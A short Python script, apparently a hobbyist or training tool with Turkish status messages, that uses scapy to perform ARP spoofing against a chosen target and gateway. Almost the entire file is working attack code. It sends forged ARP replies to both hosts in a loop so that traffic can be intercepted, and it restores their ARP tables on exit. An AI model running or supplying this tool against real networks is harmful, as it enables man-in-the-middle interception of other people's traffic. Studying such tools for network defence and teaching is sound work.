#!/usr/bin/python
# -*- coding: utf-8 -*-

import scapy.all as scapy
import time
import optparse

def user_input():
    parse = optparse.OptionParser()
    parse.add_option("-t","--target",dest="target_ip",help="enter target ip")
    parse.add_option("-g","--gateway",dest="poisoning_ip",help="enter poisoning ip")
    return parse.parse_args()

def get_mac_address(target_ip):
    arp = scapy.ARP(pdst=target_ip)
    ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined = ether / arp
    answered = scapy.srp(combined,timeout=1,verbose=False)[0]
    return answered[0][1].hwsrc

def arp_poisoning(target_ip,poisoning_ip):
    target_mac = get_mac_address(target_ip)
    arp = scapy.ARP(op=2,psrc=poisoning_ip,hwdst=target_mac,pdst=target_ip)
    scapy.send(arp,verbose=False)

def reset_operation(target_ip,poisoning_ip):
    target_mac = get_mac_address(target_ip)
    target_mac2 = get_mac_address(poisoning_ip)
    arp = scapy.ARP(op=2,psrc=poisoning_ip,hwsrc=target_mac2,pdst=target_ip,hwdst=target_mac)
    scapy.send(arp,verbose=False,count=7)

sayac = 0
(input,arguments) = user_input()
try:
    while(True):
        arp_poisoning(input.target_ip,input.poisoning_ip)
        arp_poisoning(input.poisoning_ip,input.target_ip)
        sayac += 2
        print("\rpaket yollandı.. ",sayac,end="")
        time.sleep(3)
except(KeyboardInterrupt):
    print("\n\nçıkılıyor..\n")
    reset_operation(input.target_ip,input.poisoning_ip)
    reset_operation(input.poisoning_ip,input.target_ip)
    print("\narp tablosu resetlendi\n")